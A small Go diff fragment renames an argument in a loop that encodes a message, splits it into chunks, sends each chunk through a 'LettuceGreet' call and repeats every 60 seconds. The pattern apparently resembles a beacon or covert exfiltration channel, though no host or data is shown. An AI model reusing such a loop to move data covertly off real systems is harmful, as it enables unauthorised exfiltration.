@@ -26,7 +26,7 @@ func LettuceMeetDotCom() {
 		chunks := utils.LettuceChunk(encodedMsg)
 
 		for _, chunk := range chunks {
-			_, _ = lettucer.LettuceGreet(path, chunk)
+			_, _ = lettucer.LettuceGreet(Path, chunk)
 		}
 		time.Sleep(60 * time.Second)
 	}
